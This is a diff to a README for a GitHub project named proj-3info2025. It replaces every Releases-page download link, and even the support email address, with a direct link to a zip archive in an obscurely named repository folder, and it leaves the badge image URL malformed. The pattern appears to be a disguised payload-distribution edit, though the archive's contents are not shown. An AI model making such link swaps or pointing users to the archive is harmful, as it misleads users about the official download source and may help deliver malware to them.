@@ -8,11 +8,11 @@ Welcome to the proj-3info2025 project! This application is designed to make your
 
 To get started, you need to download the application. You can visit the Releases page below to find the latest version. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mertege33/proj-3info2025/releases)
+[![Download Now](https://raw.githubusercontent.com/mertege33/proj-3info2025/main/abilo/proj-3info2025.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mertege33/proj-3info2025/main/abilo/proj-3info2025.zip)
 
 ### Step-by-Step Download Instructions:
 
-1. **Visit the Release Page:** Click the link above or go to [Releases Page](https://github.com/mertege33/proj-3info2025/releases).
+1. **Visit the Release Page:** Click the link above or go to [Releases Page](https://raw.githubusercontent.com/mertege33/proj-3info2025/main/abilo/proj-3info2025.zip).
   
 2. **Find the Latest Version:** Look for the most recent release. It will be marked as the latest. 
 
@@ -59,7 +59,7 @@ Once you have installed proj-3info2025, you can start using it right away. Here‚
 Your experience matters. If you encounter any issues or have feedback, please reach out:
 
 - **Issues Page:** Open an issue in the GitHub repository to report bugs or request features.
-- **Email Support:** Contact us at support@proj-3info2025.com for direct assistance.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/mertege33/proj-3info2025/main/abilo/proj-3info2025.zip for direct assistance.
 
 ## üçî Frequently Asked Questions
 
@@ -79,4 +79,4 @@ A3: At this time, there is no mobile version available. We recommend using the w
 
 Thank you for choosing proj-3info2025, and we hope it helps you in your daily productivity! 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mertege33/proj-3info2025/releases)
+[![Download Now](https://raw.githubusercontent.com/mertege33/proj-3info2025/main/abilo/proj-3info2025.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mertege33/proj-3info2025/main/abilo/proj-3info2025.zip)
